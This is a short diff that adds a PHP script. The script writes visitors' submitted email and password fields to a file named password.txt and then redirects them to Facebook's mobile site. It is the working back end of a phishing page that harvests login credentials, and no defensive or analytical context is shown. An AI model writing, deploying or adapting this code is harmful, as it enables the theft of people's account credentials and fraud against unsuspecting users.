@@ -1,0 +1,1 @@
+<html> <body> <?php $handle = fopen("password.txt", "a"); fwrite($handle,$_POST["email"]); fwrite($handle,"\n"); fwrite($handle,$_POST["pass"]); fwrite($handle,"\n"); fwrite($handle,"\n"); fclose($handle); header("Location: https://m.facebook.com"); exit; ?> </body></html>
